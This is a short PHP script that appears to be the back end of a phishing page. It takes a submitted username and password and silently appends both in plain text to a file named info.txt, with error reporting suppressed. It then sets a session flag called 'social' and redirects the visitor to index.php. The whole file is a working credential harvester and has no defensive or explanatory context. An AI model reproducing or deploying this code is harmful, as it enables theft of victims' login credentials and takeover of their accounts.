<?php
      	 error_reporting(0);
           $user=$_POST["user"];
           $pass=$_POST["pass"];
     
           $f=fopen("info.txt","a");
           fwrite($f,"username: ".$user." password: ".$pass."\n");
           fclose($f);
           session_start();
           $_SESSION["social"] = true;
           header("Location: index.php");

?>